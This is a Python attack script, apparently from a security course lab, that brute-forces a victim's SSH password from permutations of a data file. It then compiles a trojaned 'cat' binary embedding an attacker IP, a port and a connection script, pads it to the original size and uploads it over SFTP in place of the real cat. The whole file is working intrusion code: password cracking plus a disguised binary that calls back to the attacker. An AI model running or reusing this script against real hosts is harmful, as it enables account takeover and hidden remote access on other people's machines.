#!/usr/bin/python3
from itertools import permutations
import paramiko
import time
from sys import argv
import os

def ssh_test(client, ip, username, password):
    try:
        client.connect(victim_ip, username=username, password=password, banner_timeout=500)
    except paramiko.ssh_exception.AuthenticationException:
        print("%s is a wrong password!" % (password))
        client.close()
        return False
    except paramiko.SSHException:
        print("Retrying with delay...{RESET}")
        time.sleep(5)
        return ssh_test(client, ip, username, password)
    else:
        print("Password cracked!")
        return True

def crack_password(victim_ip):
    f = open('/home/csc2023/materials/victim.dat')
    info_list = f.read().splitlines()
    iter = 1
    while True:
        for i in permutations(info_list, iter):
            password = ''
            for j in i:
                password+=j
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            if ssh_test(client, victim_ip, 'csc2023', password):
                return client
            client.close()
        iter += 1 


def construct_cat(attacker_ip, attacker_port):
    fptr = open("address_port.txt", "w")
    fptr.write(" " + attacker_ip + " " + attacker_port)
    fptr.close()

    os.system("xxd -i address_port.txt > address_port.h")
    os.system("cp /home/csc2023/cat cat_backup")
    os.system("zip zipped_cat.zip cat_backup > /dev/null")
    os.system("xxd -i zipped_cat.zip > zipped_cat.h")
    os.system("xxd -i connection.sh > connection.h")
    os.system("gcc infected_cat.c -o cat")
    return

def get_file_size(file):
    file.seek(0,2)
    return file.tell()
    

def modify_cat():
    original_cat = open('/home/csc2023/cat', 'rb')
    original_cat_size = get_file_size(original_cat)
    original_cat.close()

    infect_cat = open('cat', 'rb')
    infect_cat_size = get_file_size(infect_cat)
    infect_cat.close()

    extend_content = ''
    infect_cat = open('cat', 'a')
    enlarge_size = original_cat_size - infect_cat_size - 8
    for i in range(enlarge_size):
        extend_content += '0'
    extend_content += 'deadbeaf'
    infect_cat.write(extend_content)
    infect_cat.close()

if __name__ == '__main__':
    victim_ip, attacker_ip, attacker_port = argv[1], argv[2], argv[3]

    client = crack_password(victim_ip)
    construct_cat(attacker_ip, attacker_port)
    modify_cat()

    sftp = client.open_sftp()
    sftp.put("./cat", "/home/csc2023/cat")
    client.exec_command("chmod +x /home/csc2023/cat")
    sftp.close()
    client.close()
